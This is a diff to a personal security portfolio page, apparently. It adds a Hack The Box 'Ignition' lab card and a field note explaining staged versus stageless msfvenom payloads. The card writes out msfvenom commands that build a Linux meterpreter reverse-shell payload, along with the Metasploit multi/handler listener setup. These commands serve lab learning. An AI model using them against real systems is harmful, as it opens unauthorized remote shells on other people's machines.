@@ -272,6 +272,32 @@
                             </div>
                         </div>
 
+                        <!-- MSFVenom / Metasploit -->
+                        <div class="bg-surface-inset border border-white/5 p-5 group hover:border-tertiary-amber/30 transition-all">
+                            <div class="flex justify-between items-start mb-3">
+                                <span class="text-[7px] font-black tracking-widest text-tertiary-amber bg-tertiary-amber/10 px-2 py-0.5 border border-tertiary-amber/20 uppercase">EASY</span>
+                                <span class="text-[7px] text-on-surface-variant opacity-30 font-mono">HTB#103</span>
+                            </div>
+                            <h4 class="text-sm font-black tracking-tight uppercase mb-1">Ignition</h4>
+                            <p class="text-[9px] text-on-surface-variant opacity-50 mb-3 leading-relaxed">Generated a staged reverse shell payload with <span class="text-tertiary-amber font-mono">msfvenom</span> and caught the connection via Metasploit's <span class="text-tertiary-amber font-mono">multi/handler</span>. Exploited a vulnerable service to achieve remote code execution and escalate to root.</p>
+                            <div class="bg-surface/60 border border-white/5 rounded p-3 mb-3 font-mono text-[8px] leading-relaxed text-primary-neon overflow-x-auto">
+                                <span class="opacity-40"># generate reverse shell payload</span><br>
+                                msfvenom -p linux/x64/meterpreter/reverse_tcp \
+                                <span class="block pl-4">LHOST=&lt;YOUR_IP&gt; LPORT=4444 -f elf -o shell.elf</span>
+                                <br><span class="opacity-40"># start listener in Metasploit</span><br>
+                                use exploit/multi/handler<br>
+                                set payload linux/x64/meterpreter/reverse_tcp<br>
+                                set LHOST &lt;YOUR_IP&gt;<br>
+                                set LPORT 4444<br>
+                                run
+                            </div>
+                            <div class="flex gap-2 flex-wrap">
+                                <span class="text-[7px] px-2 py-0.5 bg-surface-raised border border-white/5 text-tertiary-amber font-bold">MSFVENOM</span>
+                                <span class="text-[7px] px-2 py-0.5 bg-surface-raised border border-white/5 text-tertiary-amber font-bold">METASPLOIT</span>
+                                <span class="text-[7px] px-2 py-0.5 bg-surface-raised border border-white/5 text-tertiary-amber font-bold">REVERSE_SHELL</span>
+                            </div>
+                        </div>
+
                     </div>
                 </div>
             </section>
@@ -308,14 +334,14 @@
                         </p>
                     </div>
 
-                    <!-- Placeholder Note -->
-                    <div class="bg-surface-inset border border-dashed border-white/10 p-6 opacity-30">
+                    <!-- Note 3 - MSFVenom -->
+                    <div class="bg-surface-inset border-l-2 border-secondary-cyan p-6 group hover:bg-surface-raised transition-all">
                         <div class="flex items-center gap-3 mb-4">
-                            <span class="text-[7px] font-black tracking-widest uppercase">NOTE_003</span>
-                            <span class="text-[7px] text-on-surface-variant opacity-30">// PENDING_ENTRY</span>
+                            <span class="text-[7px] font-black tracking-widest text-secondary-cyan uppercase">NOTE_003</span>
+                            <span class="text-[7px] text-on-surface-variant opacity-30">// MSFVenom Payload Architecture</span>
                         </div>
-                        <p class="text-[10px] text-on-surface-variant leading-relaxed">
-                            More field notes will be logged here as discoveries are made in active labs and real-world engagements.
+                        <p class="text-[10px] text-on-surface-variant leading-relaxed opacity-70">
+                            <span class="text-primary-neon font-mono">msfvenom</span> consolidates payload generation and encoding into a single tool. The key distinction is <em>staged</em> vs <em>stageless</em> payloads — staged payloads (<span class="text-primary-neon font-mono">reverse_tcp</span>) send a small stager first that then pulls the full stage from the handler, reducing initial footprint. Stageless payloads (<span class="text-primary-neon font-mono">reverse_tcp_shell</span>) embed everything in the binary. Always match the payload architecture (<span class="text-primary-neon font-mono">x86 / x64</span>) to the target system to avoid segfaults on execution.
                         </p>
                     </div>
                 </div>
